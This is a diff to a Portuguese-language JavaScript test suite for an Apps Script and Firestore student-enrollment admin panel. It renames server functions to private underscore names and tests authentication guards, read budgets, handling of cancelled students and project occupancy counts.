@@ -4,14 +4,14 @@
  * O que se prova aqui, em ordem de importância:
  *
  *   1. o ORÇAMENTO DE LEITURA do cabeçalho de 10_Painel.gs é medido, e não
- *      afirmado: `detalheAluno` custa três leituras de ponto e nenhuma consulta;
- *      `painelEstatisticas` não faz uma única `:runQuery`; a busca por matrícula,
+ *      afirmado: `detalheAluno_` custa três leituras de ponto e nenhuma consulta;
+ *      `painelEstatisticas_` não faz uma única `:runQuery`; a busca por matrícula,
  *      CPF ou e-mail não varre nada;
  *   2. a guarda: todas as funções recusam sem token ANTES de tocar no banco —
  *      medido contando as requisições, não lendo o código;
  *   3. nenhuma consulta declara ordenação por campo junto com filtro (índice
  *      composto) nem por `__name__` DESCENDENTE (a armadilha que 04_Log.gs pagou);
- *   4. `resolverAluno` não ressuscita aluno excluído — `atualizar` é PATCH, e
+ *   4. `resolverAluno_` não ressuscita aluno excluído — `atualizar_` é PATCH, e
  *      PATCH no Firestore CRIA o documento que não existe;
  *   5. a aba Configurações não é porta dos fundos: `admin_emails` passa pelas
  *      guardas de quem tem acesso, e chave marcada como segredo não vai para a
@@ -27,8 +27,8 @@
  * ONDE O FALSO NÃO ALCANÇA, e está dito no teste que precisa disso: o
  * `UrlFetchApp` de `apoio.js` ordena documentos que NÃO TÊM o campo da ordenação
  * (usa '' como chave), enquanto o Firestore de verdade os EXCLUI do resultado. A
- * rede de segurança de `listarLotes` existe justamente para esse comportamento,
- * então ela é exercitada com `listar` trocado por um espião — e o que isso prova
+ * rede de segurança de `listarLotes_` existe justamente para esse comportamento,
+ * então ela é exercitada com `listar_` trocado por um espião — e o que isso prova
  * é a lógica da rede, não o comportamento do banco.
  *
  * Uso:  node testes/painel.js
@@ -49,19 +49,19 @@ const PASTA_GS = path.join(__dirname, '..', 'apps-script');
 //
 // 12_Disciplinas.gs entrou por causa do teste de SO_LEITURA, que confere se TODA
 // função declarada como leitura no Admin.html existe no servidor — e duas delas
-// (`listarDisciplinas`, `inscritosDaDisciplina`) nascem lá. Sem o arquivo, o
+// (`listarDisciplinas_`, `inscritosDaDisciplina_`) nascem lá. Sem o arquivo, o
 // teste acusaria função inexistente onde só falta carregar o arquivo.
 //
 // 06_Reconciliacao.gs entrou porque o painel passou a DEPENDER dele em tempo de
-// execução: `editarAluno` chama `chaveDePessoa_`, `chaveAluno_` e `reconciliar`
+// execução: `editarAluno_` chama `chaveDePessoa_`, `chaveAluno_` e `reconciliar_`
 // para que a ficha corrigida caia no mesmo endereço que a rodada produziria. Um
 // falso desses três esconderia exatamente o erro que interessa — a ficha nova num
 // endereço que a reconciliação não usa, virando linha duplicada na madrugada.
 // 13_Auditorio.gs entrou pelo mesmo motivo que 12_Disciplinas.gs: duas funções
-// da aba Auditório (`inscricoesRecentes`, `filaDeEspera`) estão em SO_LEITURA, e
+// da aba Auditório (`inscricoesRecentes_`, `filaDeEspera_`) estão em SO_LEITURA, e
 // o teste dessa lista confere se toda função dela existe no servidor. Sem o
 // arquivo, ele acusaria função inexistente onde só falta carregar.
-// 05c_Revisao.gs (21/09) entrou pelo mesmo teste: `revisarLote` é leitura pura
+// 05c_Revisao.gs (21/09) entrou pelo mesmo teste: `revisarLote_` é leitura pura
 // e está em SO_LEITURA. Quem a exercita é testes/revisao.js; aqui ela só
 // precisa existir.
 const GS = ['00_Config.gs', '01_Utils.gs', '02_Repo.gs', '03_Config.gs',
@@ -69,7 +69,21 @@ const GS = ['00_Config.gs', '01_Utils.gs', '02_Repo.gs', '03_Config.gs',
   '07b_LinkPorEmail.gs',
   '09_Projetos.gs', '10_Painel.gs', '12_Disciplinas.gs', '13_Auditorio.gs'];
 
-/** As funções desta fase, com o payload mínimo que o Admin.html manda. */
+/**
+ * A função do servidor por trás de um nome do FIO. O painel manda `'listarAlunos'`
+ * e quem roda é `listarAlunos_`: desde 16/11/2026 todo o servidor é privado, e a
+ * regra entre os dois nomes é esta — conferida em testes/portas.js, contra a
+ * lista que faz a tradução de verdade (`funcoesDoPainel_`, em 08_Api.gs, que
+ * este arquivo não carrega).
+ */
+function daFuncao(fio) {
+  return fio + '_';
+}
+
+/**
+ * As funções desta fase, com o payload mínimo que o Admin.html manda. As chaves
+ * são nomes do FIO; a função de cada uma é `daFuncao(chave)`.
+ */
 const MINHAS_FUNCOES = {
   painelEstatisticas: {},
   painelProjetos: {},
@@ -118,7 +132,7 @@ function escritas(falso) {
 }
 
 function criarAluno(api, id, campos) {
-  api.inserir('alunos', Object.assign({
+  api.inserir_('alunos', Object.assign({
     nome: 'Aluno ' + id,
     cpf: '', email: '', telefone: '', data_nascimento: '',
     matricula: '', matricula_conferida: 'NAO',
@@ -173,7 +187,7 @@ Object.keys(MINHAS_FUNCOES).forEach((funcao) => {
     semear(amb.api);
     amb.zerar();
 
-    const r = amb.api[funcao](MINHAS_FUNCOES[funcao]);
+    const r = amb.api[daFuncao(funcao)](MINHAS_FUNCOES[funcao]);
     igual(r.ok, false, funcao + ' devia recusar');
     verdadeiro(/Sess.o expirada|inv.lida/i.test(r.erro),
       'a mensagem precisa casar com o teste do Admin.html: ' + r.erro);
@@ -183,10 +197,10 @@ Object.keys(MINHAS_FUNCOES).forEach((funcao) => {
 
 teste('token de outra sessão, expirado, também não passa', () => {
   const amb = ambiente();
-  amb.api.sair(amb.token);
+  amb.api.sair_(amb.token);
   amb.zerar();
 
-  const r = amb.api.listarAlunos({ token: amb.token });
+  const r = amb.api.listarAlunos_({ token: amb.token });
   igual(r.ok, false);
   igual(amb.falso.requisicoes.length, 0);
 });
@@ -198,12 +212,12 @@ grupo('painelEstatisticas — números por agregação, nunca por varredura');
 teste('os quatro status, as três origens e o total', () => {
   const amb = ambiente();
   semear(amb.api);
-  amb.api.inserir('inscricoes', { nome: 'x' }, 'ins001');
-  amb.api.inserir('matriculados', { nome: 'x' }, '20250001');
-  amb.api.inserir('lotes', { arquivo: 'lista.csv' }, 'l001');
+  amb.api.inserir_('inscricoes', { nome: 'x' }, 'ins001');
+  amb.api.inserir_('matriculados', { nome: 'x' }, '20250001');
+  amb.api.inserir_('lotes', { arquivo: 'lista.csv' }, 'l001');
   amb.zerar();
 
-  const d = chamar(amb, 'painelEstatisticas').dados;
+  const d = chamar(amb, 'painelEstatisticas_').dados;
 
   igual(d.total, 4);
   igual(d.porStatus.CONFIRMADO, 1);
@@ -220,7 +234,7 @@ teste('nenhuma :runQuery — nem uma linha de aluno é trazida', () => {
   semear(amb.api);
   amb.zerar();
 
-  chamar(amb, 'painelEstatisticas');
+  chamar(amb, 'painelEstatisticas_');
   igual(consultas(amb.falso).length, 0, 'o painel varreu documentos para contar');
 });
 
@@ -230,7 +244,7 @@ teste('custa 13 agregações e 1 leitura de ponto — o número do cabeçalho', 
   amb.zerar();
 
   const antesIdas = amb.falso.idas.length;
-  chamar(amb, 'painelEstatisticas');
+  chamar(amb, 'painelEstatisticas_');
   // As três últimas são os cancelados (21/09), e saem numa ida só: `idas`
   // conta esperas em fila, `requisicoes` conta o que o Firestore cobra.
   igual(agregacoes(amb.falso).length, 13);
@@ -243,7 +257,7 @@ teste('qualidade conta os vazios e subtrai — a chave medida é a MATRÍCULA', 
   semear(amb.api);
   amb.zerar();
 
-  const q = chamar(amb, 'painelEstatisticas').dados.qualidade;
+  const q = chamar(amb, 'painelEstatisticas_').dados.qualidade;
   igual(q.comMatricula, 4);
   igual(q.percMatricula, 100);
   igual(q.comEmail, 3);
@@ -267,14 +281,14 @@ teste('quem está SEM matrícula é descontado — e o campo em branco é o que 
   criarAluno(amb.api, 'sem-mat', { nome: 'Sem Matrícula', email: 'x@exemplo.com' });
   amb.zerar();
 
-  const q = chamar(amb, 'painelEstatisticas').dados.qualidade;
+  const q = chamar(amb, 'painelEstatisticas_').dados.qualidade;
   igual(q.comMatricula, 4, 'contou como "com matrícula" quem tem o campo vazio');
   igual(q.percMatricula, 80, '4 de 5');
 });
 
 teste('cadastro vazio não divide por zero', () => {
   const amb = ambiente();
-  const d = chamar(amb, 'painelEstatisticas').dados;
+  const d = chamar(amb, 'painelEstatisticas_').dados;
   igual(d.total, 0);
   igual(d.qualidade.percMatricula, 0);
   igual(d.qualidade.percEmail, 0);
@@ -283,15 +297,15 @@ teste('cadastro vazio não divide por zero', () => {
 teste('sem o documento de agregados, porCurso vem vazio (o cartão some)', () => {
   const amb = ambiente();
   semear(amb.api);
-  igual(chamar(amb, 'painelEstatisticas').dados.porCurso, []);
+  igual(chamar(amb, 'painelEstatisticas_').dados.porCurso, []);
 });
 
 teste('com o documento de agregados, porCurso vem ordenado e sem metadados', () => {
   const amb = ambiente();
   semear(amb.api);
-  amb.api.inserir('agregados', { ADS: '2', ADM: '2', atualizado_em: '2026-08-05' }, 'cursos');
+  amb.api.inserir_('agregados', { ADS: '2', ADM: '2', atualizado_em: '2026-08-05' }, 'cursos');
 
-  igual(chamar(amb, 'painelEstatisticas').dados.porCurso, [
+  igual(chamar(amb, 'painelEstatisticas_').dados.porCurso, [
     { curso: 'ADM', total: 2 },
     { curso: 'ADS', total: 2 }
   ]);
@@ -322,7 +336,7 @@ teste('"Todos" não traz o status CANCELADO, o total desconta e a resposta diz q
   criarCancelado(amb.api, 'c001');
   criarCancelado(amb.api, 'c002');
 
-  const r = chamar(amb, 'listarAlunos', {});
+  const r = chamar(amb, 'listarAlunos_', {});
   igual(r.ok, true);
   igual(r.itens.length, 4);
   igual(r.itens.filter((a) => a.status === 'CANCELADO').length, 0);
@@ -339,11 +353,11 @@ teste('a página vem CHEIA mesmo com cancelados no meio dela', () => {
   const amb = ambiente();
   semearMuitos(amb.api, 52);
   ['m010', 'm020'].forEach((id) => {
-    amb.api.atualizar('alunos', id, { status: 'CANCELADO', situacao_cadastro: 'CANCELADO', cancelado_em: '2026-09-21 19:00:00' });
+    amb.api.atualizar_('alunos', id, { status: 'CANCELADO', situacao_cadastro: 'CANCELADO', cancelado_em: '2026-09-21 19:00:00' });
   });
   amb.zerar();
 
-  const r = chamar(amb, 'listarAlunos', { pagina: 1, tamanho: 50 });
+  const r = chamar(amb, 'listarAlunos_', { pagina: 1, tamanho: 50 });
   igual(r.itens.length, 50, 'a página veio com buraco');
   igual(r.total, 50);
   igual(r.paginas, 1);
@@ -353,7 +367,7 @@ teste('a página vem CHEIA mesmo com cancelados no meio dela', () => {
   // O teto de leitura é exato: 50 + os 2 escondidos, e nem um a mais.
   igual(consultas(amb.falso).length, 2, 'uma página de 50 e a página de reposição');
 
-  const p2 = chamar(amb, 'listarAlunos', { pagina: 2, tamanho: 50 });
+  const p2 = chamar(amb, 'listarAlunos_', { pagina: 2, tamanho: 50 });
   igual(p2.itens, [], 'a página 2 não existe — os 50 aceitos couberam na 1');
 });
 
@@ -361,7 +375,7 @@ teste('sem cancelado nenhum, "Todos" custa o de sempre: uma página, sem página
   const amb = ambiente();
   semearMuitos(amb.api, 25);
   amb.zerar();
-  const r = chamar(amb, 'listarAlunos', { pagina: 1, tamanho: 10 });
+  const r = chamar(amb, 'listarAlunos_', { pagina: 1, tamanho: 10 });
   igual(r.itens.length, 10);
   igual(consultas(amb.falso).length, 1);
   igual(r.cancelados_ocultos, 0);
@@ -372,7 +386,7 @@ teste('cancelado COM inscrição aparece em "Todos", com a marca — ele ocupa v
   semear(amb.api);
   criarCancelado(amb.api, 'c003', { status: 'CONFIRMADO', nome: 'Reinscrito Exemplo' });
 
-  const r = chamar(amb, 'listarAlunos', {});
+  const r = chamar(amb, 'listarAlunos_', {});
   const ele = r.itens.filter((a) => a.nome === 'Reinscrito Exemplo')[0];
   verdadeiro(ele, 'quem ocupa vaga sumiu da lista padrão');
   igual(ele.status, 'CONFIRMADO');
@@ -391,7 +405,7 @@ teste('o filtro "Cancelados" traz os DOIS casos — pela marca, não pelo status
   criarCancelado(amb.api, 'c003', { status: 'CONFIRMADO' });
   amb.zerar();
 
-  const r = chamar(amb, 'listarAlunos', { status: 'CANCELADO' });
+  const r = chamar(amb, 'listarAlunos_', { status: 'CANCELADO' });
   igual(r.itens.map((a) => a.id).sort(), ['c001', 'c003']);
   igual(r.total, 2);
   const c = consultas(amb.falso)[0].corpo.structuredQuery;
@@ -406,8 +420,8 @@ teste('a busca pela matrícula de um cancelado ACHA — busca nunca esconde', ()
   semear(amb.api);
   criarCancelado(amb.api, 'c001', { nome: 'Cancelada Exemplo', matricula: '9110777' });
 
-  igual(chamar(amb, 'listarAlunos', { busca: '9110777' }).itens.map((a) => a.nome), ['Cancelada Exemplo']);
-  igual(chamar(amb, 'listarAlunos', { busca: 'cancelada' }).itens.map((a) => a.nome), ['Cancelada Exemplo']);
+  igual(chamar(amb, 'listarAlunos_', { busca: '9110777' }).itens.map((a) => a.nome), ['Cancelada Exemplo']);
+  igual(chamar(amb, 'listarAlunos_', { busca: 'cancelada' }).itens.map((a) => a.nome), ['Cancelada Exemplo']);
 });
 
 teste('curso sozinho exclui o cancelado e o total sai exato — pela varredura do balde', () => {
@@ -418,15 +432,15 @@ teste('curso sozinho exclui o cancelado e o total sai exato — pela varredura d
   criarCancelado(amb.api, 'c001', { curso: 'ADM' });
   amb.zerar();
 
-  const r = chamar(amb, 'listarAlunos', { curso: 'ADM' });
+  const r = chamar(amb, 'listarAlunos_', { curso: 'ADM' });
   igual(r.itens.map((a) => a.id).sort(), ['a003', 'a004']);
   igual(r.total, 2);
   igual(agregacoes(amb.falso).length, 0, 'curso sozinho não agrega mais: o total é do que foi lido');
   igual(consultas(amb.falso)[0].corpo.structuredQuery.where.fieldFilter.field.fieldPath, 'curso');
 
   // E com o status junto, como antes.
-  igual(chamar(amb, 'listarAlunos', { curso: 'ADM', status: 'CANCELADO' }).itens.map((a) => a.id), ['c001']);
-  igual(chamar(amb, 'listarAlunos', { curso: 'ADM', status: 'SO_INSCRITO' }).itens.map((a) => a.id), ['a003']);
+  igual(chamar(amb, 'listarAlunos_', { curso: 'ADM', status: 'CANCELADO' }).itens.map((a) => a.id), ['c001']);
+  igual(chamar(amb, 'listarAlunos_', { curso: 'ADM', status: 'SO_INSCRITO' }).itens.map((a) => a.id), ['a003']);
 });
 
 teste('painelEstatisticas conta o status, a marca e a lista oficial — três números diferentes', () => {
@@ -434,10 +448,10 @@ teste('painelEstatisticas conta o status, a marca e a lista oficial — três n�
   semear(amb.api);
   criarCancelado(amb.api, 'c001');
   criarCancelado(amb.api, 'c003', { status: 'CONFIRMADO' });
-  amb.api.inserir('matriculados', { matricula: '9110001', situacao_cadastro: 'CANCELADO' }, '9110001');
-  amb.api.inserir('matriculados', { matricula: '9110002' }, '9110002');
+  amb.api.inserir_('matriculados', { matricula: '9110001', situacao_cadastro: 'CANCELADO' }, '9110001');
+  amb.api.inserir_('matriculados', { matricula: '9110002' }, '9110002');
 
-  const d = chamar(amb, 'painelEstatisticas').dados;
+  const d = chamar(amb, 'painelEstatisticas_').dados;
   igual(d.total, 6, 'o total do cadastro continua contando todo mundo');
   igual(d.porStatus.CANCELADO, 1);
   igual(d.porStatus.CONFIRMADO, 2);
@@ -452,36 +466,36 @@ teste('detalheAluno traz os quatro campos da marca, lidos do documento VIVO da l
   // cancelado.
   const amb = ambiente();
   criarAluno(amb.api, 'a050', { nome: 'Ainda Confirmada', status: 'CONFIRMADO', matricula: '9110050', matricula_id: '9110050' });
-  amb.api.inserir('matriculados', {
+  amb.api.inserir_('matriculados', {
     nome: 'Ainda Confirmada', matricula: '9110050', situacao_cadastro: 'CANCELADO',
     cancelado_em: '2026-09-21 19:00:00', cancelado_por: 'prof@exemplo.com', cancelado_lote_id: 'L9'
   }, '9110050');
 
-  const r = chamar(amb, 'detalheAluno', { id: 'a050' });
+  const r = chamar(amb, 'detalheAluno_', { id: 'a050' });
   igual(r.matriculado.situacao_cadastro, 'CANCELADO');
   igual(r.matriculado.cancelado_em, '2026-09-21 19:00:00');
   igual(r.matriculado.cancelado_por, 'prof@exemplo.com');
   igual(r.matriculado.cancelado_lote_id, 'L9');
 
   // Sem a marca: vazios, e não undefined — a tela concatena.
-  amb.api.inserir('matriculados', { nome: 'Ativa', matricula: '9110051' }, '9110051');
+  amb.api.inserir_('matriculados', { nome: 'Ativa', matricula: '9110051' }, '9110051');
   criarAluno(amb.api, 'a051', { nome: 'Ativa', matricula: '9110051', matricula_id: '9110051' });
-  const ativa = chamar(amb, 'detalheAluno', { id: 'a051' }).matriculado;
+  const ativa = chamar(amb, 'detalheAluno_', { id: 'a051' }).matriculado;
   igual([ativa.situacao_cadastro, ativa.cancelado_em, ativa.cancelado_por, ativa.cancelado_lote_id], ['', '', '', '']);
 });
 
 teste('resolverAluno recusa o alvo CANCELADO sem escrever — a rodada desfaria', () => {
   const amb = ambiente();
   criarCancelado(amb.api, 'c001');
-  const antes = JSON.stringify(amb.api.ler('alunos', 'c001'));
+  const antes = JSON.stringify(amb.api.ler_('alunos', 'c001'));
   amb.zerar();
 
-  const r = chamar(amb, 'resolverAluno', { id: 'c001', status: 'CONFIRMADO' });
+  const r = chamar(amb, 'resolverAluno_', { id: 'c001', status: 'CONFIRMADO' });
   igual(r.ok, false);
   verdadeiro(/cancelado na lista oficial/.test(r.erro), r.erro);
   igual(escritas(amb.falso).length, 0);
-  igual(JSON.stringify(amb.api.ler('alunos', 'c001')), antes);
-  igual(chamar(amb, 'resolverAluno', { id: 'c001', status: 'CANCELADO' }).erro, 'Status inválido.',
+  igual(JSON.stringify(amb.api.ler_('alunos', 'c001')), antes);
+  igual(chamar(amb, 'resolverAluno_', { id: 'c001', status: 'CANCELADO' }).erro, 'Status inválido.',
     'CANCELADO não é um status que se peça');
 });
 
@@ -493,7 +507,7 @@ teste('exportarCsv: a coluna "Cadastro" diz quando cancelou, e herda a peneira d
   criarCancelado(amb.api, 'c001', { nome: 'Cancelada Sem Vaga' });
   criarCancelado(amb.api, 'c003', { status: 'CONFIRMADO', nome: 'Cancelada Com Vaga' });
 
-  const todos = chamar(amb, 'exportarCsv', {});
+  const todos = chamar(amb, 'exportarCsv_', {});
   igual(todos.linhas, 5, 'sem filtro, o cancelado sem inscrição não sai — como na tela');
   const linhas = todos.csv.split('\r\n');
   igual(linhas[0].split(';')[10], '"Cadastro"');
@@ -504,45 +518,45 @@ teste('exportarCsv: a coluna "Cadastro" diz quando cancelou, e herda a peneira d
   const maria = linhas.filter((l) => /Maria da Silva/.test(l))[0];
   igual(maria.split(';')[10], '""');
 
-  const so = chamar(amb, 'exportarCsv', { status: 'CANCELADO' });
+  const so = chamar(amb, 'exportarCsv_', { status: 'CANCELADO' });
   igual(so.linhas, 2);
   verdadeiro(/Cancelada Sem Vaga/.test(so.csv));
 });
 
 teste('buscarMatriculado AVISA do cancelado e devolve a ficha inteira', () => {
-  // A porta da coordenação avisa; a pública (`matriculaConhecida`) recusa.
-  // Mutação que derruba: reaproveitar `matriculaConhecida` aqui — a ficha
+  // A porta da coordenação avisa; a pública (`matriculaConhecida_`) recusa.
+  // Mutação que derruba: reaproveitar `matriculaConhecida_` aqui — a ficha
   // viria vazia como se a matrícula não existisse.
   const amb = cenarioInclusao();
-  amb.api.atualizarEmLote('matriculados', [{ _id: '9110001', situacao_cadastro: 'CANCELADO', cancelado_em: '2026-09-21 19:00:00' }]);
+  amb.api.atualizarEmLote_('matriculados', [{ _id: '9110001', situacao_cadastro: 'CANCELADO', cancelado_em: '2026-09-21 19:00:00' }]);
 
-  const r = chamar(amb, 'buscarMatriculado', { matricula: '9110001' });
+  const r = chamar(amb, 'buscarMatriculado_', { matricula: '9110001' });
   igual(r.encontrado, true);
   igual(r.cancelado, true);
   igual(r.cancelado_em, '2026-09-21 19:00:00');
   igual(r.nome, 'Aluna Exemplo');
-  igual(chamar(amb, 'buscarMatriculado', { matricula: '9110999' }).cancelado, false);
+  igual(chamar(amb, 'buscarMatriculado_', { matricula: '9110999' }).cancelado, false);
 });
 
 teste('incluirInscricao grava a cancelada como não conferida e avisa que está CANCELADA', () => {
-  // Mutação que derruba: `matriculaConhecida` no lugar da leitura — o aviso
+  // Mutação que derruba: `matriculaConhecida_` no lugar da leitura — o aviso
   // diria "não está na lista", que é mentira para quem tem a lista na frente.
   const amb = cenarioInclusao();
-  amb.api.atualizarEmLote('matriculados', [{ _id: '9110001', situacao_cadastro: 'CANCELADO', cancelado_em: '2026-09-21 19:00:00' }]);
+  amb.api.atualizarEmLote_('matriculados', [{ _id: '9110001', situacao_cadastro: 'CANCELADO', cancelado_em: '2026-09-21 19:00:00' }]);
 
-  const r = chamar(amb, 'incluirInscricao', pedidoDeInclusao());
+  const r = chamar(amb, 'incluirInscricao_', pedidoDeInclusao());
   igual(r.ok, true, r.erro);
   igual(r.matricula_conferida, 'NAO');
   verdadeiro(/CANCELADA na lista oficial \(em 21\/09\/2026\)/.test(r.aviso), r.aviso);
   verdadeiro(!/não está na lista oficial/.test(r.aviso), 'os dois avisos não podem sair juntos');
-  igual(amb.api.ler('inscricoes', r.id).matricula_conferida, 'NAO');
+  igual(amb.api.ler_('inscricoes', r.id).matricula_conferida, 'NAO');
 });
 
 teste('esquecerMarcaDaReconciliacao_ reescreve com -1 e preserva dia, gasto e custo', () => {
   // Mutação que derruba: `deleteProperty` — o gasto do dia zeraria, e o freio
   // das 15.000 leituras deixaria passar rodadas a mais.
   const amb = cenarioAtualizarCedo();
-  chamar(amb, 'atualizarAlunos', { pagina: 1, tamanho: 50 });
+  chamar(amb, 'atualizarAlunos_', { pagina: 1, tamanho: 50 });
   const antes = amb.api.marcaDaReconciliacao_();
   verdadeiro(antes.custo > 0 && antes.gasto > 0 && antes.dia, 'a rodada não deixou marca');
 
@@ -557,7 +571,7 @@ teste('esquecerMarcaDaReconciliacao_ reescreve com -1 e preserva dia, gasto e cu
 
   // E o efeito que interessa: o próximo Atualizar cruza de novo, sem nada ter
   // entrado.
-  const r = chamar(amb, 'atualizarAlunos', { pagina: 1, tamanho: 50 });
+  const r = chamar(amb, 'atualizarAlunos_', { pagina: 1, tamanho: 50 });
   igual(r.reconciliacao.rodou, true, 'o freio 1 continuou fechado depois de esquecer a marca');
   igual(amb.api.marcaDaReconciliacao_().gasto, antes.gasto + antes.custo, 'a segunda rodada somou ao gasto preservado');
 });
@@ -579,13 +593,13 @@ grupo('painelProjetos');
 
 teste('devolve os projetos com ocupação e as vagas padrão', () => {
   const amb = ambiente();
-  amb.api.inserir('projetos', {
+  amb.api.inserir_('projetos', {
     codigo: 'r-cidades', nome: 'R+ Cidades', vagas: '60', ativo: 'SIM',
     inscricoes_abertas: 'SIM', ordem: '1', professor: 'Marina'
   }, 'p1');
-  amb.api.inserir('inscricoes', { projeto_id: 'p1' }, 'i1');
+  amb.api.inserir_('inscricoes', { projeto_id: 'p1' }, 'i1');
 
-  const r = chamar(amb, 'painelProjetos');
+  const r = chamar(amb, 'painelProjetos_');
   igual(r.ok, true);
   igual(r.itens.length, 1);
   igual(r.itens[0].id, 'p1');
@@ -594,22 +608,22 @@ teste('devolve os projetos com ocupação e as vagas padrão', () => {
   igual(r.vagasPadrao, 60);
 });
 
-// O painel come da mesma `listarProjetos` que o site, então a chave de
+// O painel come da mesma `listarProjetos_` que o site, então a chave de
 // diagnóstico o alcança junto. O que ele NÃO pode receber é um zero no lugar do
 // que ninguém contou: a coordenação decide inativar e remover projeto por esse
-// número, e `removerProjeto` (09_Projetos.gs) continua contando de verdade.
+// número, e `removerProjeto_` (09_Projetos.gs) continua contando de verdade.
 teste('com contar_ocupacao_na_lista em NAO, a ocupação vem null — nunca zero', () => {
   const amb = ambiente();
-  amb.api.inserir('projetos', {
+  amb.api.inserir_('projetos', {
     codigo: 'r-cidades', nome: 'R+ Cidades', vagas: '2', ativo: 'SIM',
     inscricoes_abertas: 'SIM', ordem: '1', professor: 'Marina'
   }, 'p1');
-  amb.api.inserir('inscricoes', { projeto_id: 'p1' }, 'i1');
-  amb.api.inserir('inscricoes', { projeto_id: 'p1' }, 'i2');
-  amb.api.gravarConfig('contar_ocupacao_na_lista', 'NAO');
-  amb.api.limparCacheConfig();
+  amb.api.inserir_('inscricoes', { projeto_id: 'p1' }, 'i1');
+  amb.api.inserir_('inscricoes', { projeto_id: 'p1' }, 'i2');
+  amb.api.gravarConfig_('contar_ocupacao_na_lista', 'NAO');
+  amb.api.limparCacheConfig_();
 
-  const r = chamar(amb, 'painelProjetos');
+  const r = chamar(amb, 'painelProjetos_');
 
   igual(r.itens[0].inscritos, null, 'zero aqui viraria "0 / 2" num projeto cheio');
   igual(r.itens[0].ocupacao_contada, false, 'a tela precisa saber POR QUE o número não veio');
@@ -617,12 +631,12 @@ teste('com contar_ocupacao_na_lista em NAO, a ocupação vem null — nunca zero
   igual(r.itens[0].situacao, 'ABERTO', 'sem contagem não há como saber que lotou');
 
   // A saída da coordenação: quem precisa do número abre a lista de quem está lá.
-  igual(chamar(amb, 'inscritosDoProjeto', { id: 'p1' }).itens.length, 2,
+  igual(chamar(amb, 'inscritosDoProjeto_', { id: 'p1' }).itens.length, 2,
     'o botão Inscritos conta de verdade, e é o que o aviso da tela manda usar');
 });
 
 /**
- * `inscritosDoProjeto` — abrir a ocupação da aba Projetos.
+ * `inscritosDoProjeto_` — abrir a ocupação da aba Projetos.
  *
  * A tabela dizia "47 / 60" e não dizia QUEM. O que se prova aqui, em ordem de
  * importância:
@@ -641,13 +655,13 @@ teste('com contar_ocupacao_na_lista em NAO, a ocupação vem null — nunca zero
 grupo('inscritosDoProjeto — abrir o número da ocupação');
 
 function projetoComInscritos(amb, quantos, extras) {
-  amb.api.inserir('projetos', {
+  amb.api.inserir_('projetos', {
     codigo: 'r-cidades', nome: 'R+ Cidades', vagas: '60', ativo: 'SIM',
     inscricoes_abertas: 'SIM', ordem: '1', professor: 'Marina'
   }, 'p1');
 
   for (let i = 1; i <= quantos; i++) {
-    amb.api.inserir('inscricoes', Object.assign({
+    amb.api.inserir_('inscricoes', Object.assign({
       projeto_id: 'p1', projeto_nome: 'R+ Cidades',
       matricula: String(9110000 + i), nome: 'Aluno ' + String(i).padStart(3, '0'),
       email: 'aluno' + i + '@exemplo.com', whatsapp: '',
@@ -661,12 +675,12 @@ teste('traz quem está no projeto, e não quem está em outro', () => {
   const amb = ambiente();
   projetoComInscritos(amb, 2);
 
-  amb.api.inserir('projetos', { nome: 'Outro', vagas: '10', ativo: 'SIM' }, 'p2');
-  amb.api.inserir('inscricoes', {
+  amb.api.inserir_('projetos', { nome: 'Outro', vagas: '10', ativo: 'SIM' }, 'p2');
+  amb.api.inserir_('inscricoes', {
     projeto_id: 'p2', projeto_nome: 'Outro', matricula: '9119999', nome: 'De Outro Projeto'
   }, 'i9999');
 
-  const r = chamar(amb, 'inscritosDoProjeto', { id: 'p1' });
+  const r = chamar(amb, 'inscritosDoProjeto_', { id: 'p1' });
   igual(r.ok, true);
   igual(r.projeto, 'R+ Cidades');
   igual(r.vagas, 60);
@@ -684,7 +698,7 @@ teste('projeto sem ninguém responde ok com lista vazia — não é erro', () =>
   const amb = ambiente();
   projetoComInscritos(amb, 0);
 
-  const r = chamar(amb, 'inscritosDoProjeto', { id: 'p1' });
+  const r = chamar(amb, 'inscritosDoProjeto_', { id: 'p1' });
   igual(r.ok, true, 'projeto vazio virou erro');
   igual(r.itens, []);
   igual(r.lidas, 0);
@@ -694,7 +708,7 @@ teste('projeto sem ninguém responde ok com lista vazia — não é erro', () =>
 
 teste('projeto que não existe recusa com o texto que ensina a saída', () => {
   const amb = ambiente();
-  const r = chamar(amb, 'inscritosDoProjeto', { id: 'nao-existe' });
+  const r = chamar(amb, 'inscritosDoProjeto_', { id: 'nao-existe' });
   igual(r.ok, false);
   verdadeiro(/Recarregue a lista/.test(r.erro), r.erro);
 });
@@ -704,7 +718,7 @@ teste('o teto é respeitado E o corte é dito na tela', () => {
   amb.api.PAINEL_MAX_INSCRITOS_PROJETO = 3;
   projetoComInscritos(amb, 5);
 
-  const r = chamar(amb, 'inscritosDoProjeto', { id: 'p1' });
+  const r = chamar(amb, 'inscritosDoProjeto_', { id: 'p1' });
   igual(r.itens.length, 3, 'leu mais do que o teto');
   igual(r.lidas, 3);
   verdadeiro(/Mostrando as primeiras 3/.test(r.aviso || ''),
@@ -717,12 +731,12 @@ teste('quem está na fila de espera aparece marcado, e fora da conta de vagas', 
   // com "60 / 60" na tabela faria a coordenação concluir que o limite furou.
   const amb = ambiente();
   projetoComInscritos(amb, 2);
-  amb.api.inserir('inscricoes', {
+  amb.api.inserir_('inscricoes', {
     projeto_id: 'p1', projeto_nome: 'R+ Cidades', matricula: '9110003',
     nome: 'Aluno 003', em_espera: 'SIM', espera_de: 'p1'
   }, 'i0003');
 
-  const r = chamar(amb, 'inscritosDoProjeto', { id: 'p1' });
+  const r = chamar(amb, 'inscritosDoProjeto_', { id: 'p1' });
   igual(r.lidas, 3, 'quem espera some da lista');
   igual(r.emEspera, 1);
   igual(r.ocupam, 2, 'quem está na fila não pode contar como vaga ocupada');
@@ -731,13 +745,13 @@ teste('quem está na fila de espera aparece marcado, e fora da conta de vagas', 
 
 teste('UMA consulta, um filtro de igualdade, e nenhum orderBy declarado', () => {
   // Filtrar por um campo e ordenar por OUTRO exige índice composto e devolve
-  // `400 The query requires an index` — a cicatriz de `ultimosRegistros`
+  // `400 The query requires an index` — a cicatriz de `ultimosRegistros_`
   // (04_Log.gs). A ordem alfabética é feita em JavaScript, sobre o que voltou.
   const amb = ambiente();
   projetoComInscritos(amb, 2);
   amb.zerar();
 
-  chamar(amb, 'inscritosDoProjeto', { id: 'p1' });
+  chamar(amb, 'inscritosDoProjeto_', { id: 'p1' });
 
   igual(consultas(amb.falso).length, 1, 'mais de uma consulta por clique');
   igual(agregacoes(amb.falso).length, 0, 'agregação não é preciso: a lista já é a contagem');
